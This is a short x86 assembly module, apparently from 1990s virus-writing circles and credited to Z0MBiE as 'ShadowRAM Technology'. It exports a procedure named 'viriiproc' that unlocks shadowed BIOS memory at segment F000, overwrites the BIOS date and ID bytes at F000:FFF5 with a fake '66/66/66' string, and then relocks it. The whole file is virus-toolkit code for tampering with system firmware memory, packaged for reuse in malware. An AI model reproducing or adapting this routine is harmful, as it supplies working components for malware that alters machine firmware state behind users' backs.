
                model tpascal
                locals @@
                .386p

                .code

public          viriiproc

viriiproc       proc    far

                call    get_sh_state
                push    sh_R
                push    sh_W
                push    sh_C
                push    sh_X
                or      sh_R, seg_F000_64k
                or      sh_W, seg_F000_64k
                or      sh_C, seg_F000_64k
                call    set_sh_state

                mov     si, offset bios_stuff

                push    0F000H
                pop     es
                mov     di, 0FFF5h

                mov     cx, 16
                cld
                segcs
                rep     movsb

                pop     sh_X
                pop     sh_C
                pop     sh_W
                pop     sh_R
                call    set_sh_state

alredy:         ret
                endp

include         sh.inc

                db      'ShadowRAM Technology (c) 1996,97 Z0MBiE'

bios_stuff      db      '66/66/66'
                db      0,0FFh,0F0h

                end
